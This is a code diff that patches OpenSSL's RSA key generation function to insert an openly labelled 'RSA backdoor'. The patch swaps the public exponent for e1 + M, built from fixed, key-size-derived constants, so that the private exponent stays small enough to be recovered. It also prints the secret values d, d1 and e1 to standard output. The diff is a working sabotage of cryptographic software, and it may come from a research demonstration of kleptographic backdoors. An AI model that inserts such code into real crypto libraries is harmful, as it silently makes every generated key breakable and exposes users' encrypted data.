@@ -95,6 +95,11 @@ rsa_builtin_keygen(RSA *rsa, int bits, BIGNUM *e_value, BN_GENCB *cb)
 	int bitsp, bitsq, ok = -1, n = 0;
 	BN_CTX *ctx = NULL;
 
+	BIGNUM *M = NULL, *two = NULL, *t = NULL, *d1 = NULL, *e1 = NULL, *e1M = NULL, *temp = NULL;
+	char *repr_BN = NULL;
+	BIO *bio_out;
+	int t_bit_idx = -1;
+
 	ctx = BN_CTX_new();
 	if (ctx == NULL)
 		goto err;
@@ -106,6 +111,20 @@ rsa_builtin_keygen(RSA *rsa, int bits, BIGNUM *e_value, BN_GENCB *cb)
 	if ((r2 = BN_CTX_get(ctx)) == NULL)
 		goto err;
 	if ((r3 = BN_CTX_get(ctx)) == NULL)
+		goto err;
+	if ((M = BN_CTX_get(ctx)) == NULL)
+		goto err;
+	if ((two = BN_CTX_get(ctx)) == NULL)
+		goto err;
+	if ((t = BN_CTX_get(ctx)) == NULL)
+		goto err;
+	if ((d1 = BN_CTX_get(ctx)) == NULL)
+		goto err;
+	if ((temp = BN_CTX_get(ctx)) == NULL)
+		goto err;
+	if ((e1 = BN_CTX_get(ctx)) == NULL)
+		goto err;
+	if ((e1M = BN_CTX_get(ctx)) == NULL)
 		goto err;
 
 	bitsp = (bits + 1) / 2;
@@ -128,6 +147,55 @@ rsa_builtin_keygen(RSA *rsa, int bits, BIGNUM *e_value, BN_GENCB *cb)
 		goto err;
 	if (!rsa->iqmp && ((rsa->iqmp = BN_new()) == NULL))
 		goto err;
+
+	bio_out = BIO_new_fp(stdout, BIO_NOCLOSE);
+	BIO_printf(bio_out, "\n[RSA backdoor] STEP 1\n");
+	BN_clear(two);
+	BN_add_word(two, (BN_ULONG) 2);
+	BN_clear(t);
+
+	if (bits == 1024)
+		t_bit_idx = 10;
+	else if (bits == 2048)
+		t_bit_idx = 11;
+	else if (bits == 4096)
+		t_bit_idx = 12;
+	else
+		goto err;
+
+	if (t_bit_idx == -1)
+		goto err;
+
+	BN_set_bit(t, t_bit_idx); // t = 2 ** t_bit_idx
+
+	BN_sub_word(t, (BN_ULONG) 3);
+	BN_clear(M);
+	BN_exp(M, two, t, ctx); // M = 2 ** (t - 3)
+	BN_lshift1(temp, M);
+	BN_swap(M, temp); // M = 2 * (2 ** (t - 3))	// Lower bound
+	/*
+	 * M is fixed for now (to the lowest possible value called by rand).
+	 */
+
+	// print M in decimal notation
+	repr_BN = BN_bn2dec(M);
+	BIO_printf(bio_out, "\n[RSA backdoor] M = %s\n", repr_BN);
+	OPENSSL_free(repr_BN);
+
+	BN_clear(d1);
+	BN_set_bit(d1, t_bit_idx); // t = 2 ** t_bit_idx
+	BN_div_word(d1, (BN_ULONG) 8-1); // d1 = t / (8-1)
+	BN_exp(temp, two, d1, ctx); // d1 = 2 ** (t / (8-1))
+	BN_lshift1(d1, temp);
+	BN_add_word(d1, (BN_ULONG) 1);
+	/*
+	 * d1 is fixed for now (to the lowest possible value called by rand).
+	 */
+
+	// print d1 in decimal notation
+	repr_BN = BN_bn2dec(d1);
+	BIO_printf(bio_out, "\n[RSA backdoor] d1 = %s\n", repr_BN);
+	OPENSSL_free(repr_BN);
 
 	BN_copy(rsa->e, e_value);
 
@@ -201,12 +269,52 @@ rsa_builtin_keygen(RSA *rsa, int bits, BIGNUM *e_value, BN_GENCB *cb)
 	if (!BN_mod_inverse(rsa->d, rsa->e, pr0, ctx))	/* d */
 		goto err;
 
+	BIO_printf(bio_out, "\n[RSA backdoor] STEP 2\n");
+	BN_clear(e1);
+
+	/* while igcdex(d1,phi,’e1’)<>1 do d1 := d1+2; od: */
+	while (BN_mod_inverse(e1, d1, pr0, ctx) != NULL && BN_is_one(e1) != 1)
+		BN_add_word(d1, (BN_ULONG) 2);
+
+	BIO_printf(bio_out, "\n[RSA backdoor] STEP 3\n");
+	repr_BN = BN_bn2dec(e1);
+	BIO_printf(bio_out, "\n[RSA backdoor] e1 = %s\n", repr_BN);
+	OPENSSL_free(repr_BN);
+	repr_BN = BN_bn2dec(d1);
+	BIO_printf(bio_out, "\n[RSA backdoor] d1 = %s\n", repr_BN);
+	OPENSSL_free(repr_BN);
+
+	BN_clear(rsa->d);
+	BN_clear(e1M);
+	BN_add(e1M, e1, M);
+
+	/* while igcdex(e1+M,phi,’d’)<>1 do */
+	while (BN_mod_inverse(rsa->d, e1M, pr0, ctx) != NULL && BN_is_one(rsa->d) != 1) {
+		/* while igcdex(d1,phi,’e1’)<>1 do d1 := d1+2; od: */
+		while (BN_mod_inverse(e1, d1, pr0, ctx) != NULL && BN_is_one(e1) != 1)
+			BN_add_word(d1, (BN_ULONG) 2);
+
+		BN_add(e1M, e1, M);
+	}
+
 	/* set up d for correct BN_FLG_CONSTTIME flag */
 	if (!(rsa->flags & RSA_FLAG_NO_CONSTTIME)) {
 		d = &local_d;
 		BN_with_flags(d, rsa->d, BN_FLG_CONSTTIME);
 	} else
 		d = rsa->d;
+
+	BIO_printf(bio_out, "\n[RSA backdoor] STEP 4\n");
+
+	BN_mod(d, rsa->d, pr0, ctx); /* d := d mod phi: */
+	BN_add(rsa->e, e1, M); /* e := e1 + M: */
+
+	repr_BN = BN_bn2dec(rsa->e);
+	BIO_printf(bio_out, "\n[RSA backdoor] e = %s\n", repr_BN);
+	OPENSSL_free(repr_BN);
+	repr_BN = BN_bn2dec(d);
+	BIO_printf(bio_out, "\n[RSA backdoor] d = %s\n", repr_BN);
+	OPENSSL_free(repr_BN);
 
 	/* calculate d mod (p-1) */
 	if (!BN_mod(rsa->dmp1, d, r1, ctx))
